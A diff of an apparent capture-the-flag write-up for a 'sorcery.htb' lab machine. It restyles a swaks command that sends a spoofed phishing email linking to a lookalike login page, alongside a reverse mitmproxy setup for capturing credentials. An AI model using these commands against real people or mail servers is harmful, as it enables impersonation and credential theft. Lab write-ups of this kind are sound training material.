@@ -33,9 +33,7 @@ sudo mitmproxy --mode reverse:https://git.sorcery.htb --certs pwn.sorcery.htb.pe
 
 Send a phishing email to capture credentials:
 
-```
-proxychains4 -f /etc/proxychains4.conf swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data "Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"
-```
+<pre><code><span style="color:#00ffff">└──╼[👾]~/machine/guardian $</span> <span style="color:#ffff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data "Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>
 
 Extract the captured credentials from the proxied session:
 
@@ -45,4 +43,3 @@ open credentials.png
 ```
 
 *Screenshots omitted.*
-
